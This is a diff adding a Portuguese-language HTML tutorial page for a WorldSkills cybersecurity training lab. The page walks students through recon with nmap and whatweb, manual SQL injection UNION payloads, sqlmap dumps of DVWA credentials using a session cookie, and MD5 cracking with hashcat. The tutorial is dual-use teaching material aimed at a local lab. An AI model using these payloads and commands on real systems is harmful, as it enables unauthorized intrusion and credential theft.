@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cyber SENAI Porto — Lab Web (Aluno)</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='88'>&#x1F6E1;</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#080b10; --card:#0f141c; --card2:#0b0f15; --line:#1b2432;
+    --txt:#e6eaf1; --mut:#8e9bb0; --mut2:#5c6675;
+    --acc:#4ee39a; --acc2:#56c7e8; --warn:#f3b54a; --crit:#f06d6d; --info:#a78bfa;
+    --grid:rgba(78,227,154,.045);
+    --mono:"JetBrains Mono",ui-monospace,"SFMono-Regular",Menlo,Consolas,monospace;
+    --sans:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;
+    background:
+      linear-gradient(var(--grid) 1px,transparent 1px) 0 0/46px 46px,
+      linear-gradient(90deg,var(--grid) 1px,transparent 1px) 0 0/46px 46px,
+      radial-gradient(900px 480px at 100% -16%,rgba(78,227,154,.05) 0,transparent 58%),
+      var(--bg);
+    color:var(--txt);font-family:var(--sans);line-height:1.62;font-size:15.5px;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}
+  a{color:var(--acc2);text-decoration:none} a:hover{text-decoration:underline}
+  .wrap{max-width:1000px;margin:0 auto;padding:0 20px}
+  header{border-bottom:1px solid var(--line);
+    background:linear-gradient(var(--grid) 1px,transparent 1px) 0 0/46px 46px,var(--card2);
+    padding:32px 0 0;position:relative}
+  header::after{content:"";position:absolute;left:0;right:0;bottom:-1px;height:1px;
+    background:linear-gradient(90deg,transparent,var(--acc),transparent);opacity:.5}
+  .brand{display:flex;align-items:center;gap:9px;color:var(--mut);font-family:var(--mono);
+    font-size:12px;letter-spacing:.1em;text-transform:uppercase}
+  .brand::before{content:"$";color:var(--acc);font-weight:600;margin-right:-2px}
+  .brand .dot{width:8px;height:15px;border-radius:1px;background:var(--acc);box-shadow:0 0 7px rgba(78,227,154,.5);
+    animation:blink 1.15s steps(1) infinite}
+  @keyframes blink{0%,55%{opacity:1}56%,100%{opacity:0}}
+  h1{font-size:clamp(23px,3.4vw,33px);margin:12px 0 6px;letter-spacing:-.02em;line-height:1.15}
+  h1 .g{background:linear-gradient(90deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .sub{color:var(--mut);max-width:74ch;margin:0 0 20px}
+  .tabs{display:flex;gap:8px;flex-wrap:wrap}
+  .tab{display:flex;align-items:center;gap:9px;border:1px solid var(--line);background:var(--card);
+    color:var(--mut);padding:10px 18px;border-radius:12px 12px 0 0;cursor:pointer;font-size:14.5px;font-weight:600;
+    border-bottom:none;position:relative;top:1px;font-family:var(--mono);letter-spacing:.02em}
+  .tab .ic{font-size:16px}
+  .tab.active{background:var(--bg);color:var(--txt)}
+  .panel{display:none;padding:30px 0 70px}
+  .panel.active{display:block}
+  .mdbox{max-width:880px;margin:0 auto;line-height:1.62;color:var(--txt)}
+  .mdbox h1{font-size:25px;margin:18px 0 10px}
+  .mdbox h2{font-size:20px;margin:30px 0 10px;border-bottom:1px solid var(--line);padding-bottom:7px}
+  .mdbox h3{font-size:16.5px;margin:22px 0 7px;color:var(--acc)}
+  .mdbox h4{font-size:14px;margin:14px 0 4px;color:var(--mut)}
+  .mdbox p{margin:9px 0}
+  .mdbox ul,.mdbox ol{margin:9px 0 9px 4px;padding-left:22px}
+  .mdbox li{margin:5px 0}
+  .mdbox pre{background:rgba(0,0,0,.33);border:1px solid var(--line);border-radius:9px;padding:13px 15px;overflow:auto;font-family:var(--mono);font-size:12.6px;line-height:1.5;margin:10px 0;white-space:pre}
+  .mdbox code{font-family:var(--mono);background:rgba(0,0,0,.3);border:1px solid var(--line);padding:1px 6px;border-radius:5px;font-size:12.2px;color:var(--acc)}
+  .mdbox pre code{background:none;border:none;padding:0;color:inherit}
+  .mdbox blockquote{border-left:3px solid var(--acc);margin:12px 0;padding:8px 14px;color:var(--txt);background:rgba(78,227,154,.045);border-radius:0 8px 8px 0}
+  .mdbox blockquote p{margin:4px 0}
+  .mdbox hr{border:none;border-top:1px solid var(--line);margin:26px 0}
+  .foot{color:var(--mut2);font-size:12px;border-top:1px solid var(--line);padding:18px 0;text-align:center;font-family:var(--mono)}
+</style>
+</head>
+<body>
+<header>
+  <div class="wrap">
+    <div class="brand"><span class="dot"></span> Cyber SENAI Porto &middot; WorldSkills Skill 54 &middot; Lab Web (Aluno)</div>
+    <h1>Lab Web: <span class="g">entenda o desafio e aprenda os primeiros ataques</span></h1>
+    <p class="sub">Ambiente de treino com DVWA e Juice Shop. Comece pela aba <b>Sobre o Desafio</b> para entender onde isto se encaixa, depois siga o <b>Tutorial</b> passo a passo. Uso autorizado, apenas em laboratório local.</p>
+    <div class="tabs">
+      <div class="tab active" data-tab="sobre"><span class="ic">&#x1F9ED;</span> Sobre o Desafio</div>
+      <div class="tab" data-tab="tut"><span class="ic">&#x1F6E0;&#xFE0F;</span> Tutorial</div>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+  <section id="sobre" class="panel active"><div class="mdbox" id="mount-sobre"></div></section>
+  <section id="tut" class="panel"><div class="mdbox" id="mount-tut"></div></section>
+</main>
+
+<div class="foot">Cyber SENAI Porto &middot; Material de treino &middot; Instrutor Rafael Reis</div>
+
+<script type="text/plain" id="md-sobre"># Sobre o Desafio — Lab Web (DVWA + Juice Shop)
+### Cyber SENAI Porto · WorldSkills Cyber Security (Skill 54)
+
+## O que é este desafio
+É uma **prova prática (hands-on)** de exploração web. O aluno ataca aplicações **propositalmente vulneráveis** rodando no próprio laboratório (DVWA em `localhost:8081` e Juice Shop em `localhost:3000`) para **encontrar e explorar** as vulnerabilidades web mais comuns. Não é múltipla escolha: o aluno precisa **explorar de verdade** e entregar **evidência** (comando/payload + print) de cada tarefa.
+
+## Onde se enquadra no WorldSkills Cyber Security
+O WorldSkills Cyber Security (Skill 54) é dividido em módulos de **Enterprise Infrastructure Security**, **Incident Response / Forense / Application Security**, **Blue Team** e **Red Team**. Este desafio pertence ao lado **ofensivo (Red Team / Penetration Testing)**, com forte ligação com **Application Security** — é a etapa em que o competidor demonstra que sabe **atacar uma aplicação web** e, na sequência, **explicar como corrigir**. Também exercita a competência de **documentação/relatório**, que é pontuada na competição.
+
+## A qual prova da plataforma ele se liga
+- **Prova E — CTF / Pentest (ofensiva):** é a casa natural deste desafio — reconhecimento e *web exploitation* (SQLi, XSS, LFI, etc.).
+- **Prova F — Application Security (defensiva):** cada falha explorada aqui tem sua **correção** lá (OWASP Top 10). Atacar e saber corrigir é o que o WorldSkills premia.
+- **Aba Ferramentas (Arsenal) + Laboratório (VMs):** fornecem as ferramentas (sqlmap, Burp, hashcat…) e o ambiente (Kali + Docker) usados no desafio.
+
+## Competências avaliadas
+- **Reconhecimento** (fingerprint de tecnologia, portas/serviços).
+- **Injeção — OWASP A05:** SQL Injection e Command Injection.
+- **Cross-Site Scripting (XSS).**
+- **File Inclusion / LFI.**
+- **Quebra de senha** (hash → texto claro).
+- **Documentação:** registrar comando/payload + evidência de cada passo.
+
+## Objetivo pedagógico
+Treinar o reflexo do competidor: **reconhecer a falha rápido → explorar com segurança no lab → documentar → saber a correção**. É a ponte entre a teoria (conceitos das provas) e a mão na massa (atacar um alvo real e controlado).
+
+## Nível e duração
+**Iniciante → intermediário.** Duração sugerida: **~2 horas.** Pontuação: **100 pontos + bônus.** Para turmas avançadas, repetir no DVWA em nível **Medium/High** (exige bypass de filtros).
+
+## Pré-requisitos
+1. **Laboratório montado** (Kali + Docker; DVWA e Juice Shop no ar) — ver *Ferramentas → Laboratório (VMs) → Lab Tudo-em-Um*.
+2. Ter estudado o **Tutorial** (mesma área do instrutor).
+
+## Como se conecta ao restante do treinamento
+> **Conceitos (Provas A–F) → Arsenal (Ferramentas) → Lab (ambiente) → ESTE DESAFIO (aplicar atacando) → Correção (Prova F).**
+
+Ou seja: o aluno aprende o conceito, conhece a ferramenta, monta o ambiente, **ataca de verdade** aqui, e fecha o ciclo entendendo como **defender**. É exatamente o perfil que a competição exige: dominar os dois lados.
+
+## Ética
+Todas as técnicas só podem ser usadas em sistemas **autorizados** (laboratório, ambientes próprios e a competição). Fora disso, é crime. O profissional WorldSkills domina a técnica **e** a responsabilidade.
+</script>
+<script type="text/plain" id="md-tut"># Tutorial Passo a Passo — Primeiros Ataques no Lab Web
+### Cyber SENAI Porto · WorldSkills Cyber Security · DVWA + Juice Shop
+
+> **Como ler este tutorial.** Todo comando segue sempre a mesma lógica, em 3 passos:
+> **1) o comando que vamos executar → 2) para que ele serve → 3) o que esperamos que ele retorne.**
+> E cada ataque segue a lógica das provas: **o que é (conceito) → explorar → o que esperar → como corrigir.**
+> Uso **autorizado** apenas: este é um laboratório local, de treino.
+
+---
+
+## Parte 0 — Preparar o ambiente (5 min)
+
+**1. Conferir se o lab está no ar.**
+
+Execute (no terminal do Kali):
+```
+docker ps
+```
+**Para que serve:** lista os containers que estão **rodando agora**. É como você confirma que os alvos (DVWA, Juice Shop, etc.) estão de pé antes de começar.
+
+**O que esperar:** uma tabela com 5 containers e status **Up** — `lab-dvwa`, `lab-juice-shop`, `lab-webgoat`, `lab-wordpress`, `lab-wp-db`.
+
+**Não apareceu nada, ou faltam containers? Inicie os serviços.** É normal estarem desligados depois de reiniciar a VM:
+```
+# 1) garante que o serviço do Docker está ligado
+sudo systemctl start docker
+
+# 2) entra na pasta do lab e sobe os alvos
+cd ~/lab
+docker compose up -d        # se der "command not found", use: docker-compose up -d
+```
+**Para que serve:** o `systemctl start docker` liga o motor do Docker; o `docker compose up -d` sobe todos os alvos definidos no `docker-compose.yml` em segundo plano (`-d` = *detached*).
+
+**O que esperar:** algumas linhas `Creating/Starting ... done`. Rode `docker ps` de novo — agora os 5 containers aparecem como **Up**.
+> 💡 O `up -d` **reaproveita** as imagens já baixadas, então é rápido (não baixa tudo de novo). Para desligar no fim do dia: `docker compose down` (os dados do DVWA/WordPress continuam salvos para a próxima vez).
+
+**2. Acessar o DVWA.** Abra o **Firefox** no Kali e vá em `http://localhost:8081`
+   - Login: **admin** / **password**
+   - Clique em **Create / Reset Database** (botão no fim da página) e logue de novo.
+   - Vá em **DVWA Security** (menu esquerdo) e selecione **Low**. (Comece fácil; depois suba.)
+
+**3. Acessar o Juice Shop.** Abra `http://localhost:3000` (vamos usar na Parte 6).
+
+> 💡 Dica: deixe o **Burp Suite** aberto em paralelo (Proxy → Intercept Off, só para ver o histórico das requisições). Opcional, mas ajuda a entender o que acontece.
+
+---
+
+## Parte 1 — Reconhecimento (10 min)
+
+**O que é:** antes de atacar, você mapeia o alvo — portas, serviços e tecnologias. É o primeiro passo de qualquer teste: você precisa saber *com o que* está lidando antes de escolher o ataque.
+
+No nosso lab já sabemos que o endereço é `localhost`. Vamos rodar os dois comandos de recon e entender cada um.
+
+### 1.1 Identificar as tecnologias do site — `whatweb`
+
+Execute:
+```
+whatweb http://localhost:8081
+```
+**Para que serve:** o `whatweb` faz o **fingerprint** (impressão digital) do site. Ele acessa a página e, a partir dos cabeçalhos HTTP, cookies e pistas no HTML, identifica **as tecnologias por trás**: servidor web, linguagem, CMS, frameworks e, quando dá, as versões. É recon **passivo** — você só olha o que o site já entrega, sem atacar nada.
+
+**O que esperar:** uma linha com as tecnologias detectadas, parecida com:
+```
+http://localhost:8081 [200 OK] Apache[2.4.x], HTTPServer[Debian][Apache/2.4.x],
+PHP[8.x], X-Powered-By[PHP/8.x], Cookies[PHPSESSID], IP[127.0.0.1]
+```
+👉 **O que procurar:** o servidor (**Apache**) e a linguagem (**PHP**). Saber que é **PHP + formulário de login** já aponta **SQL Injection** como um caminho provável — por isso o recon guia o ataque.
+
+### 1.2 Confirmar portas e serviços — `nmap`
+
+Execute:
+```
+nmap -sV -p 8081,3000,8080,8082 localhost
+```
+**Para que serve:** o `nmap` é o scanner de portas. O `-p` diz **quais portas** checar; o `-sV` tenta descobrir **qual serviço e versão** respondem em cada porta aberta. Confirma que os alvos estão ativos e o que exatamente roda em cada um.
+
+**O que esperar:** uma tabela de portas → serviço → versão:
+```
+PORT     STATE SERVICE VERSION
+3000/tcp open  http    Node.js Express framework   (Juice Shop)
+8080/tcp open  http    ...                          (WebGoat)
+8081/tcp open  http    Apache httpd 2.4.x           (DVWA)
+8082/tcp open  http    Apache httpd                 (WordPress)
+```
+👉 **O que procurar:** `STATE open` = porta ativa. A coluna **VERSION** é ouro: uma versão específica permite procurar vulnerabilidades conhecidas (CVEs) daquele software.
+
+### E se você NÃO souber o endereço do alvo?
+
+No lab usamos `localhost`, mas num teste real você recebe só uma **faixa de IPs** (escopo) e precisa **descobrir o alvo** primeiro. Mesma lógica: cada comando, para que serve, o que esperar.
+
+**a) Descobrir a sua própria rede.**
+```
+ip a
+```
+*Serve para* ver o seu IP e a máscara. *Espere* algo como `inet 192.168.56.10/24` → sua rede é `192.168.56.0/24`.
+
+**b) Achar os hosts vivos na faixa.**
+```
+nmap -sn 192.168.56.0/24
+```
+*Serve para* fazer uma varredura "de ping" (sem escanear portas) e listar **quem está ligado**. *Espere* uma lista de `Nmap scan report for 192.168.56.x` — cada um é um host vivo.
+> Alternativa por ARP (acha até quem ignora ping): `netdiscover -r 192.168.56.0/24`.
+
+**c) Identificar qual host é o alvo (quem tem web).**
+```
+nmap -p 80,443,3000,8080 --open 192.168.56.0/24
+```
+*Serve para* mostrar só quem tem **porta web aberta**. *Espere* um ou poucos IPs com `open` — esses são os candidatos.
+
+**d) Com o IP em mãos, siga o recon normal:** `nmap -sV IP` e `whatweb http://IP` (os mesmos 1.1 e 1.2, trocando `localhost` pelo IP).
+
+Se te deram um **domínio** em vez de IP, resolva antes:
+```
+dig alvo.local +short
+```
+*Serve para* traduzir o nome em IP. *Espere* um endereço IP na saída (ou use `nslookup alvo.local`).
+
+### E se eu não souber as portas?
+
+Acima eu listei as portas (8081, 3000, ...) porque **nós** as definimos no `docker-compose` — foi um atalho do lab. Normalmente você **não** sabe; quem descobre é o nmap:
+
+- **Scan padrão** (as 1000 portas mais comuns): `nmap -sV IP` — sem `-p`, já varre as mais usadas.
+- **Todas as 65535 portas:** `nmap -p- IP` — mais lento, não deixa passar serviço em porta incomum.
+- **Rápido e completo:** `nmap -p- --min-rate 1000 -T4 IP` para achar as portas abertas, depois `nmap -sV -p PORTAS_ABERTAS IP` só nelas.
+
+> **Regra de bolso:** porta conhecida → use `-p`; porta desconhecida → descubra com `-p-` (ou o scan padrão) e **só então** rode o `-sV`.
+
+**O que observar no fim da Parte 1:** anote a tecnologia de cada alvo. Esse mapa é o que decide o próximo passo (no DVWA: PHP + MySQL → SQL Injection).
+
+---
+
+## Parte 2 — SQL Injection (SQLi) no DVWA (40 min)
+
+**O que é:** a aplicação monta uma consulta SQL **juntando a sua entrada como texto**, sem tratar. Se você colocar caracteres de SQL (como a aspa `'`), consegue **mudar o sentido da consulta** — ler dados que não deveria, burlar login, etc. É a CWE-89 e uma das falhas mais críticas.
+
+### 2.1 Entenda a query por trás (o "porquê")
+
+Quando você digita um ID no DVWA, por baixo dos panos ele roda algo assim:
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '  SUA_ENTRADA  ';
+```
+Repare que a sua entrada entra **entre aspas**. Se você digitar `1`, vira:
+```sql
+... WHERE user_id = '1';
+```
+Mas se você digitar `1' OR '1'='1`, vira:
+```sql
+... WHERE user_id = '1' OR '1'='1';
+```
+Agora a condição `'1'='1'` é **sempre verdadeira** → o banco devolve **todos** os usuários. Foi você que "abriu a aspa" e injetou lógica nova. Esse é o coração do SQLi.
+
+### 2.2 Testar do zero (passo a passo)
+
+> **⚠️ Onde testar (leia antes de começar).** Os payloads de SQLi **NÃO** vão no terminal do Kali — eles são digitados **no navegador (Firefox)**, dentro do **próprio site do DVWA**. Para chegar no lugar certo:
+> 1. No Firefox, abra `http://localhost:8081` e faça login (**admin** / **password**).
+> 2. No menu da **esquerda**, clique em **SQL Injection**.
+> 3. A página mostra uma caixinha de texto com o rótulo **User ID** e um botão **Submit**. **É nessa caixinha que você digita cada payload abaixo** e clica em **Submit** a cada teste.
+> 4. O resultado aparece **logo abaixo do formulário**, na mesma página.
+>
+> 👉 **Como saber onde cada coisa vai, no tutorial todo:** se o passo mostra um **campo** (User ID, Email…) ou uma **URL**, é no **navegador**. Se mostra um comando tipo `nmap`, `sqlmap` ou `hashcat`, é no **terminal**. Os payloads do **2.2 e 2.3** são todos no **campo User ID** do navegador.
+
+1. **Comportamento normal:** no campo **User ID**, digite `1` e clique em **Submit**.
+   *O que esperar:* aparece **1 usuário** (`First name` / `Surname`). Guarde essa imagem mental do "normal".
+2. **Testar se é injetável** — no mesmo campo **User ID**, digite só uma aspa e Submit:
+   ```
+   1'
+   ```
+   *Para que serve:* uma aspa sozinha **quebra** a sintaxe da query. Se o campo for vulnerável, o banco reclama.
+   *O que esperar:* um **erro de SQL** (`You have an error in your SQL syntax...`) ou o resultado some. Erro = você quebrou a sintaxe = **é injetável**. (Se não der erro, o campo pode estar tratando a entrada.)
+3. **Confirmar a injeção** (condição sempre verdadeira) — de novo no campo **User ID**:
+   ```
+   1' OR '1'='1
+   ```
+   *Para que serve:* injeta uma condição que é sempre verdade, forçando o banco a devolver tudo.
+   *O que esperar:* retornam **vários** usuários. Confirmado.
+
+> 💡 Dica: no DVWA a SQLi é por **GET**, então dá para fazer tudo pela URL também: `.../vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit` (codifique espaços como `%20` se precisar).
+
+### 2.3 Extrair dados de verdade com UNION (a parte importante)
+
+Confirmar a falha é só o começo. Para **extrair dados** usamos a técnica **UNION SELECT**, que "cola" o resultado de uma segunda consulta (sua) no resultado da primeira. Para funcionar, a sua consulta precisa ter o **mesmo número de colunas** que a original. Vamos descobrir isso em etapas — cada payload tem um objetivo claro.
+
+> 💡 **Lembre:** todos os payloads abaixo continuam indo no **mesmo campo User ID** da página SQL Injection do DVWA, no **navegador** (não no terminal). Digite um, clique em **Submit**, veja o resultado abaixo do formulário, e passe para o próximo.
+
+**Passo 1 — Descobrir quantas colunas a consulta tem** (com `ORDER BY`).
+
+Execute, um de cada vez:
+```
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+```
+*Para que serve:* `ORDER BY N` pede para ordenar pela coluna N. O banco só aceita até o número de colunas que a consulta realmente tem — então você vai subindo até dar erro.
+*O que esperar:* funciona em `1` e `2`, e **dá erro** no `3` → a consulta tem **2 colunas** (o último que funcionou). O `-- -` no fim é um **comentário SQL** que "apaga" o resto da query original. *(No MySQL é traço-traço-espaço; por isso `-- -`.)*
+
+**Passo 2 — Ver onde cada coluna aparece na tela.**
+```
+0' UNION SELECT 1,2-- -
+```
+*Para que serve:* descobrir **qual posição** da tela corresponde a cada coluna, para saber onde seus dados vão aparecer.
+*O que esperar:* aparece `First name: 1` e `Surname: 2`. Ou seja, a coluna 1 vira o "First name" e a 2 o "Surname". *(Usei `0'` — um ID que não existe — para a tela mostrar **só** os dados injetados, sem o usuário 1 no meio.)*
+
+**Passo 3 — Pegar informações do banco** (prova de que você controla a consulta).
+```
+0' UNION SELECT user(),version()-- -
+0' UNION SELECT database(),2-- -
+```
+*Para que serve:* `user()`, `version()` e `database()` são funções do MySQL que revelam com quem e com o quê você está falando.
+*O que esperar:* o usuário do banco (ex.: `root@localhost`), a versão do MySQL e o **nome do banco** (ex.: `dvwa`).
+
+**Passo 4 — Listar as tabelas do banco.**
+```
+0' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+```
+*Para que serve:* o `information_schema` é o **catálogo** do MySQL — um banco que lista todos os outros bancos, tabelas e colunas. Aqui pedimos os nomes das tabelas do banco atual.
+*O que esperar:* aparecem as tabelas (ex.: `guestbook`, `users`). A tabela `users` é o alvo.
+
+**Passo 5 — Listar as colunas da tabela `users`.**
+```
+0' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+```
+*Para que serve:* agora pedimos ao catálogo os **nomes das colunas** da tabela `users`, para saber onde estão as credenciais.
+*O que esperar:* colunas como `user_id`, `first_name`, `user`, `password`, `avatar`. As que interessam: **`user`** e **`password`**.
+
+**Passo 6 — Extrair as credenciais (o prêmio).**
+```
+0' UNION SELECT user,password FROM users-- -
+```
+*Para que serve:* finalmente lemos o conteúdo das duas colunas que importam.
+*O que esperar:* a lista de usuários e seus **hashes de senha** (MD5). Guarde o hash do **admin** — vamos quebrá-lo no 2.5.
+
+> Resumo da técnica UNION: **conte as colunas (ORDER BY) → ache a posição visível (UNION SELECT 1,2) → navegue pelo `information_schema` (tabelas → colunas) → extraia os dados.** É sempre essa sequência.
+
+### 2.4 Automatizar com sqlmap (quando o manual fica repetitivo)
+
+O **sqlmap** faz tudo isso sozinho. Mas ele precisa se passar por você (logado), então você fornece o **cookie da sessão**.
+
+**Pegar o cookie — jeito mais fácil (pelo Console):**
+1. Esteja **logado** no DVWA no Firefox.
+2. Pressione **F12**. Ele abre no **Inspetor** por padrão — clique na aba **Console** (no topo do painel das ferramentas de desenvolvedor).
+3. Na linha de digitação (com o `>`), escreva e dê **Enter**:
+   ```
+   document.cookie
+   ```
+   *Para que serve:* imprime, em texto, todos os cookies que o seu navegador tem para este site — inclusive o da sua sessão.
+   *O que esperar:* uma string como:
+   ```
+   "language=en; cookieconsent_status=dismiss; PHPSESSID=h2tcr4rn6vqisv5ptmjpn76of1; security=low"
+   ```
+4. Dessa string, use só as **duas** partes que importam: **`PHPSESSID=...`** e **`security=low`** (pode ignorar `language` e `cookieconsent`).
+5. **⚠️ ATENÇÃO — é esse valor que você vai colar nos comandos.** Em **todos** os comandos do sqlmap abaixo aparece `PHPSESSID=SEU_PHPSESSID`. Isso é só um **texto de exemplo** (um "preencha aqui"). Você **precisa trocar** o `SEU_PHPSESSID` pelo **seu** valor real (o que apareceu no passo 3). Veja a diferença:
+   - ❌ **Errado** (deixou o exemplo como está): `--cookie="PHPSESSID=SEU_PHPSESSID; security=low"`
+   - ✅ **Certo** (colou o seu valor real): `--cookie="PHPSESSID=h2tcr4rn6vqisv5ptmjpn76of1; security=low"`
+
+   Se rodar **sem trocar**, o sqlmap não fica logado, é jogado para a tela de login e vai dizer que "nada é injetável" — mesmo o alvo sendo vulnerável.
+
+**Alternativa (pela aba Armazenamento):** com o F12 aberto, clique na aba **Armazenamento** (se não aparecer, clique na setinha **`>>`** no fim das abas) → abra **Cookies** → clique em **`http://localhost:8081`** → copie o valor de **`PHPSESSID`** e confirme que há **`security = low`**.
+
+> ⚠️ **Erro mais comum — "all tested parameters do not appear to be injectable".** Se o sqlmap testar tudo e dizer que **nada é injetável**, procure no começo da saída uma linha assim:
+> ```
+> got a 302 redirect to 'http://localhost:8081/login.php'. Do you want to follow? [Y/n]
+> ```
+> Esse **302 → login.php** significa que o sqlmap **não está logado**. Quase sempre é porque você deixou o `PHPSESSID=SEU_PHPSESSID` **literal** (o texto de exemplo) em vez do **seu** cookie de verdade. Sem login, o DVWA manda toda requisição para a tela de login — todas as páginas ficam iguais e o sqlmap conclui (certo) que não há injeção ali. **Correção:** pegue o valor real do `PHPSESSID` (passo do Console acima, com `document.cookie`) e troque `SEU_PHPSESSID` por ele. Dica: comece sempre pelo **Passo 1 (detecção)**, não pule direto para `--tables`.
+
+**Rodar o sqlmap (um passo de cada vez):**
+
+A ideia é ir **montando o comando aos poucos**: cada passo pega o comando anterior e **acrescenta parâmetros no final**. Rode tudo **no terminal** do Kali. ⚠️ **Em TODOS os comandos abaixo, troque o `SEU_PHPSESSID` pelo seu valor real** (o do passo do cookie, logo acima) — se deixar o texto de exemplo, não vai funcionar.
+
+**O que cada parâmetro significa:** `-u` = a URL/alvo · `--cookie` = sua sessão (logado) · `--batch` = responde as perguntas sozinho · `--dbs` = liste os bancos · `-D` = escolha um banco · `--tables` = liste as tabelas · `-T` = escolha uma tabela · `--columns` = liste as colunas · `-C` = escolha colunas · `--dump` = extraia os dados.
+
+---
+
+**Passo 1 — Detectar a injeção.**
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch
+```
+*Para que serve:* o sqlmap acessa a URL e testa sozinho vários tipos de injeção no parâmetro `id`.
+*O que esperar:* bastante texto rolando — não se assuste. Você só precisa achar as **linhas-chave** no meio:
+```
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|
+
+[16:50:12] [INFO] testing connection to the target URL
+[16:50:13] [INFO] GET parameter 'id' appears to be dynamic
+[16:50:15] [INFO] GET parameter 'id' is 'AND boolean-based blind' injectable
+[16:50:16] [INFO] GET parameter 'id' is 'MySQL >= 5.0 error-based' injectable
+[16:50:17] [INFO] GET parameter 'id' is 'Generic UNION query (NULL)' injectable
+[16:50:17] [INFO] the back-end DBMS is MySQL
+GET parameter 'id' is vulnerable.
+back-end DBMS: MySQL >= 5.0
+```
+👉 **Procure por:** a linha **`GET parameter 'id' is vulnerable`** (achou a falha! 🎯) e **`back-end DBMS is MySQL`** (descobriu o tipo de banco). As linhas `boolean-based / error-based / UNION query` são as técnicas que funcionaram. Se aparecer uma pergunta `[y/N]`, o `--batch` já responde sozinho.
+
+---
+
+**Passo 2 — Listar os bancos de dados.** Pegue o **mesmo comando do Passo 1** e **acrescente `--dbs`** no fim:
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch --dbs
+```
+*Para que serve:* pedir a **lista de bancos** que existem no servidor.
+*O que esperar:* no fim da saída, um bloco assim:
+```
+available databases [2]:
+[*] dvwa
+[*] information_schema
+```
+👉 O **`dvwa`** é o nosso banco (o `information_schema` é o "catálogo" interno do MySQL — pode ignorar).
+
+---
+
+**Passo 3 — Listar as tabelas do `dvwa`.** Agora escolha o banco com `-D dvwa` e peça `--tables`:
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch -D dvwa --tables
+```
+*Para que serve:* entrar no banco `dvwa` e listar as **tabelas** dele.
+*O que esperar:*
+```
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+```
+👉 A tabela **`users`** é o alvo.
+
+---
+
+**Passo 4 — Listar as colunas da `users`.** Escolha a tabela com `-T users` e peça `--columns`:
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch -D dvwa -T users --columns
+```
+*Para que serve:* dentro da tabela `users`, listar as **colunas**.
+*O que esperar:* uma lista com `user_id`, `first_name`, `user`, `password`, `avatar`… 👉 as que interessam são **`user`** e **`password`**.
+
+---
+
+**Passo 5 — Extrair as credenciais (o prêmio).** Escolha as colunas com `-C user,password` e peça `--dump`:
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch -D dvwa -T users -C user,password --dump
+```
+*Para que serve:* **extrair** (dump) o conteúdo das colunas `user` e `password`.
+*O que esperar:* a tabela com os usuários e os hashes das senhas:
+```
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------------------------------------------+
+| user    | password                                    |
++---------+---------------------------------------------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
++---------+---------------------------------------------+
+```
+👉 Cada linha é um **usuário** e o **hash** da senha dele. O sqlmap até **quebra** os hashes conhecidos e mostra a senha em **parênteses** (ex.: `admin` → `password`). Se ele perguntar "crack them via dictionary-based attack? [Y/n]", é só deixar seguir.
+
+> 💡 **Resumo:** cada passo é o anterior **+ um parâmetro no fim** → `--batch` (detecta) → `--dbs` (quais bancos) → `-D dvwa --tables` (quais tabelas) → `-D dvwa -T users --columns` (quais colunas) → `-D dvwa -T users -C user,password --dump` (extrai). É sempre essa escada.
+
+### 2.5 Quebrar o hash (do hash ao texto claro)
+
+Os hashes do DVWA são **MD5** (modo `-m 0` no hashcat).
+
+Execute:
+```
+echo 'HASH_DO_ADMIN' > hash.txt
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+**Para que serve:** o `echo` salva o hash num arquivo; o `hashcat -m 0` testa cada palavra da wordlist **rockyou** (14 milhões de senhas), calcula o MD5 de cada uma e compara com o seu hash até achar a que bate.
+
+**O que esperar:** depois de alguns segundos, a senha em texto claro aparece ao lado do hash. Veja o resultado com `hashcat -m 0 hash.txt --show` (a do admin costuma ser `password`).
+> Se a wordlist estiver zipada: `gunzip /usr/share/wordlists/rockyou.txt.gz` antes.
+
+### 2.6 Como corrigir 🟢
+
